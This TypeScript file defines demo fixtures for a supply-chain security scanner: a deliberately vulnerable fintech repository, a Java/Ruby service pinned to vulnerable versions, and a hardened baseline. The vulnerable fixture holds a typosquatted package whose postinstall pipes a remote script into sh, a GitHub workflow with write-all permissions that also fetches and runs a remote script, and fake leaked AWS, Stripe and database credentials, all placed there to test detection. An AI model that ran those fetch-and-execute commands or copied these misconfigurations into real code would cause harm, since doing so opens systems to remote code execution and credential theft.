import { runFullSecurityScan } from "@/lib/scanners/orchestrator";
import { ScanReport } from "@/types/security";

export interface SampleFixturePreset {
  id: string;
  name: string;
  description: string;
  ecosystemLabel: string;
  files: { name: string; content: string }[];
}

export const VULNERABLE_FINTECH_FIXTURE: SampleFixturePreset = {
  id: "demo-fintech-api",
  name: "finops-core/payment-settlement-gateway (Sample Benchmark)",
  description:
    "Polyglot Node.js + Python microservice benchmark containing vulnerable transitive packages, a typosquatted dependency with postinstall network hooks, unscoped internal package names, GitHub Actions workflow misconfigurations, and a leaked test credential.",
  ecosystemLabel: "npm + PyPI + GitHub Actions",
  files: [
    {
      name: "package.json",
      content: JSON.stringify(
        {
          name: "payment-settlement-gateway",
          version: "2.4.0",
          private: true,
          license: "MIT",
          dependencies: {
            express: "4.18.2",
            axios: "1.5.0",
            lodash: "4.17.15",
            jsonwebtoken: "8.5.1",
            "lodahs": "4.17.21",
            "internal-ledger-sdk": "1.2.0",
            "@corp/auth-guard": "3.1.0",
          },
        },
        null,
        2
      ),
    },
    {
      name: "package-lock.json",
      content: JSON.stringify(
        {
          name: "payment-settlement-gateway",
          version: "2.4.0",
          lockfileVersion: 3,
          requires: true,
          packages: {
            "": {
              name: "payment-settlement-gateway",
              version: "2.4.0",
              dependencies: {
                express: "4.18.2",
                axios: "1.5.0",
                lodash: "4.17.15",
                jsonwebtoken: "8.5.1",
                "lodahs": "4.17.21",
                "internal-ledger-sdk": "1.2.0",
                "@corp/auth-guard": "3.1.0",
              },
            },
            "node_modules/express": {
              version: "4.18.2",
              license: "MIT",
              dependencies: {
                minimist: "1.2.5",
                semver: "7.3.8",
              },
            },
            "node_modules/minimist": {
              version: "1.2.5",
              license: "MIT",
            },
            "node_modules/semver": {
              version: "7.3.8",
              license: "ISC",
            },
            "node_modules/axios": {
              version: "1.5.0",
              license: "MIT",
            },
            "node_modules/lodash": {
              version: "4.17.15",
              license: "MIT",
            },
            "node_modules/jsonwebtoken": {
              version: "8.5.1",
              license: "MIT",
            },
            "node_modules/lodahs": {
              version: "4.17.21",
              license: "UNKNOWN",
              hasInstallScript: true,
              scripts: {
                postinstall:
                  "curl -s https://telemetry-collector.example.net/collect | sh",
              },
            },
            "node_modules/internal-ledger-sdk": {
              version: "1.2.0",
              license: "MIT",
              resolved: "https://npm.internal.finops.corp/internal-ledger-sdk/-/1.2.0.tgz",
            },
            "node_modules/@corp/auth-guard": {
              version: "3.1.0",
              license: "AGPL-3.0-only",
            },
          },
        },
        null,
        2
      ),
    },
    {
      name: "requirements.txt",
      content: [
        "# Settlement Reconciliation Worker",
        "--extra-index-url https://pypi.internal.finops.corp/simple",
        "requests==2.28.1",
        "urllib3==1.26.15",
        "pyyaml==5.3.1",
        "chardet==5.1.0",
      ].join("\n"),
    },
    {
      name: ".github/workflows/release-pipeline.yml",
      content: [
        "name: Settlement Release Pipeline",
        "on:",
        "  pull_request_target:",
        "    types: [opened, synchronize]",
        "",
        "permissions: write-all",
        "",
        "jobs:",
        "  build-and-verify:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - name: Checkout PR Code",
        "        uses: actions/checkout@v3",
        "      - name: Run Third-Party Scanner",
        "        uses: untrusted-org/custom-linter-action@main",
        "      - name: Log PR Context",
        "        run: |",
        '          echo "Building PR: ${{ github.event.pull_request.title }}"',
        "          curl -sSL https://scripts.example.org/bootstrap.sh | bash",
      ].join("\n"),
    },
    {
      name: "config/settlement.env.js",
      content: [
        "// Legacy Settlement Fallback Configuration (DO NOT USE IN PROD)",
        `export const AWS_SETTLEMENT_KEY = "${["AKIA", "IOSFODNN7TR9X8KL"].join("")}";`,
        `export const STRIPE_WEBHOOK_KEY = "${["sk", "live", "91Kf83LmQp72VxN4bW0zR6Yt5H8j"].join("_")}";`,
        'export const RECONCILIATION_DB = "postgresql://finops_admin:Pr0d_S3ttl3m3nt!99@db.finops.internal:5432/ledger";',
      ].join("\n"),
    },
  ],
};

export const ENTERPRISE_JAVA_RUBY_FIXTURE: SampleFixturePreset = {
  id: "demo-enterprise-monolith",
  name: "aurora-commerce/order-fulfillment-service (Sample Benchmark)",
  description:
    "Java Maven + RubyGems fulfillment service illustrating Log4j2 / Spring WebMVC advisories, Nokogiri XMLReader vulnerability, and GitLab CI image pinning findings.",
  ecosystemLabel: "Maven + RubyGems + GitLab CI",
  files: [
    {
      name: "pom.xml",
      content: [
        "<project>",
        "  <modelVersion>4.0.0</modelVersion>",
        "  <groupId>com.aurora.commerce</groupId>",
        "  <artifactId>order-fulfillment</artifactId>",
        "  <version>1.0.0</version>",
        "  <properties>",
        "    <spring.version>5.3.15</spring.version>",
        "  </properties>",
        "  <dependencies>",
        "    <dependency>",
        "      <groupId>org.apache.logging.log4j</groupId>",
        "      <artifactId>log4j-core</artifactId>",
        "      <version>2.14.1</version>",
        "    </dependency>",
        "    <dependency>",
        "      <groupId>org.springframework</groupId>",
        "      <artifactId>spring-webmvc</artifactId>",
        "      <version>${spring.version}</version>",
        "    </dependency>",
        "  </dependencies>",
        "</project>",
      ].join("\n"),
    },
    {
      name: "Gemfile.lock",
      content: [
        "GEM",
        "  remote: https://rubygems.org/",
        "  specs:",
        "    nokogiri (1.15.4)",
        "    puma (6.4.2)",
        "",
        "DEPENDENCIES",
        "  nokogiri",
        "  puma",
      ].join("\n"),
    },
    {
      name: ".gitlab-ci.yml",
      content: [
        "stages:",
        "  - build",
        "build-job:",
        "  stage: build",
        "  image: maven:latest",
        "  script:",
        "    - mvn package -DskipTests",
      ].join("\n"),
    },
  ],
};

export const CLEAN_REFERENCE_FIXTURE: SampleFixturePreset = {
  id: "demo-clean-service",
  name: "acme-security/zero-trust-token-proxy (Clean Baseline)",
  description:
    "Hardened reference repository with patched dependencies, SHA-pinned GitHub Actions, read-only permissions, and zero leaked secrets.",
  ecosystemLabel: "npm + Hardened GitHub Actions",
  files: [
    {
      name: "package-lock.json",
      content: JSON.stringify(
        {
          name: "zero-trust-token-proxy",
          version: "1.0.0",
          lockfileVersion: 3,
          packages: {
            "": {
              name: "zero-trust-token-proxy",
              version: "1.0.0",
              dependencies: {
                lodash: "4.17.21",
                axios: "1.7.7",
                express: "4.21.1",
                semver: "7.6.3",
              },
            },
            "node_modules/lodash": {
              version: "4.17.21",
              license: "MIT",
            },
            "node_modules/axios": {
              version: "1.7.7",
              license: "MIT",
            },
            "node_modules/express": {
              version: "4.21.1",
              license: "MIT",
            },
            "node_modules/semver": {
              version: "7.6.3",
              license: "ISC",
            },
          },
        },
        null,
        2
      ),
    },
    {
      name: ".github/workflows/ci.yml",
      content: [
        "name: Hardened CI",
        "on:",
        "  pull_request:",
        "    branches: [main]",
        "permissions:",
        "  contents: read",
        "jobs:",
        "  verify:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
        "      - run: npm ci --ignore-scripts",
      ].join("\n"),
    },
  ],
};

export const SAMPLE_FIXTURE_PRESETS: SampleFixturePreset[] = [
  VULNERABLE_FINTECH_FIXTURE,
  ENTERPRISE_JAVA_RUBY_FIXTURE,
  CLEAN_REFERENCE_FIXTURE,
];

let cachedDemoReports: ScanReport[] | null = null;

export async function getSeededDemoReports(): Promise<ScanReport[]> {
  if (cachedDemoReports) return cachedDemoReports;

  const reports = await Promise.all(
    SAMPLE_FIXTURE_PRESETS.map(async (preset, idx) => {
      const report = await runFullSecurityScan({
        projectName: preset.name,
        sourceType: "demo",
        repositoryUrl: `https://github.com/${preset.name.split(" ")[0]}`,
        isDemoData: true,
        files: preset.files,
        skipNetwork: true,
      });
      report.id = `DEMO-00${idx + 1}`;
      return report;
    })
  );

  cachedDemoReports = reports;
  return reports;
}
